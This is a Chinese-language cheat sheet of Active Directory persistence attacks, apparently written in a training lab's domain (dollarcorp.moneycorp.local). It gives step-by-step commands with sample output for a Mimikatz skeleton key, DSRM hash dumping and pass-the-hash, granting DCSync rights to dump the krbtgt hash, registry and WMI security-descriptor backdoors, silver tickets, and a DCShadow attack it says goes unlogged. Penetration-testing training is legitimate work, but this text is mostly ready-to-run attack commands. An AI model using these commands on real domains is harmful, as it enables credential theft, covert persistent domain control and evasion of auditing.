# 制作万能钥匙
在一台有DA权限的shell里运行下面命令

### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.loc
al
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
 Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student370的身份进入主机
```Enter-PSSession –Computername dcorp-std370 –credential dcorp\student370```

# DSRM利用
目录服务还原模式。除了krbtgt服务帐号外，域控上还有个可利用的账户：目录服务还原模式（DSRM）账户，这个密码是在DC安装的时候设置的，所以一般不会被修改

用有DA权限的shell，运行下面命令，dump出DSRM的哈希密码

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dcorp-dc

SAMKey : 33e0913ef3886d77d5873060bcea1cfb

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
```
这里会出现Administrator的哈希(也就是DSRM的密码)：```a102ad5753f4c441e3af31c97fad86fd```

再用下面命令dump出现在Administrator的密码，与上面DSRM的密码进行比较

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760
```
新的密码是：```af0686cc0ca8f04df42210c9ac980760```

DSRM administrator不允许登陆，用之前的session进入DC修改

要先bypass ASMI

再运行下面命令，修改DSRM的远程登录策略
```
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```


现在用DSRM的原始哈希，来运行一个有DA权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
```

#  Dcsync 

using ACLs – Rights Abuse

查找当前账号是否有DCSync的权限
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
 如果没有任何返回，表示没有权限

来到有DA权限的shell

添加完全控制权限
```
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student366 -Rights All -Verbose
```
再把Dcsync权限赋予当前学生账号student366
```
Add-ObjectAcl -TargetDistinguishedName"dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName student366 -Rights DCSync -Verbose
```

现在回到学生机shell，再次查看本账号是否有Dcsync权限

```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.IdentityReference -match "student366") -and (($_.ObjectType -match'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

如果已经出现```ActiveDirectoryRights : GenericAll```表示成功赋权

执行Dcsync,导出krbtgt哈希（也可以是其他用户）
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# Security Descriptors（安全描述符）

在DA权限shell引入RACE.ps1框架
```
PS C:\ad> . .\RACE.ps1
```

为WMI修改安全描述符，允许student366进入WMI
```
Set-RemoteWMI -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
```

查看
```
gwmi -class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 没有登录凭证，修改安全描述符，使得学生机可以在DC上执行命令

引入RACE.ps1，域名写全
```
PS C:\ad> . .\RACE.ps1
PS C:\ad> Set-RemotePSRemoting -SamAccountName student366 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

执行whoami命令
```
Invoke-Command -ScriptBlock{whoami} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### 无管理员密码的情况下从目标机器上dump出哈希

Modifying DC registry security descriptors for remote hash retrieval using DAMP

在DC上修改权限，允许本账号（student366）远程dump出哈希，在DAshell
```
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student366 -Verbose
```

在学生shell
引入框架
```
PS C:\ad> . .\RACE.ps1
```

dump出dcorp-dc这台机器的哈希
```
PS C:\ad> Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
VERBOSE: Bootkey/SysKey : 85462B93FC25EE67BB07AD899096199B
VERBOSE: LSA Key        : FD3251451B1293B9ED7AF4BED8E19A678F514B9BC2B42B796E2C72AF156945E9

ComputerName                        MachineAccountHash
------------                        ------------------
dcorp-dc.dollarcorp.moneycorp.local 126289c16302fb23b71ec09f0d3d5391
```

现在我们有了这台机器的哈希，可以用来制作银票

基于HOST服务的银票
```
. .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

基于RPCSS服务的银票
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```


# DCShadow

DCShadow 是一种通过临时模仿域控制器来掩盖某些操作的攻击。如果您在根域中具有域管理员或企业管理员权限，则可以将其用于林级持久性。

或者，作为域管理员，为选定的用户提供 DCShadow 攻击所需的权限（使用Set-DCShadowPermissions.ps1cmdlet）。

```
Set-DCShadowPermissions -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
```

然后，在任何机器上，使用 Mimikatz 进行 DCShadow 攻击。

```
# Set SPN for user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-3219952063-538504511-45109]])
```

最后，从 DA 会话或之前提供 DCShadow 权限的用户的会话中，运行 DCShadow 攻击。前面的那些操作将不会记录到日志。

```
lsadump::dcshadow /push
```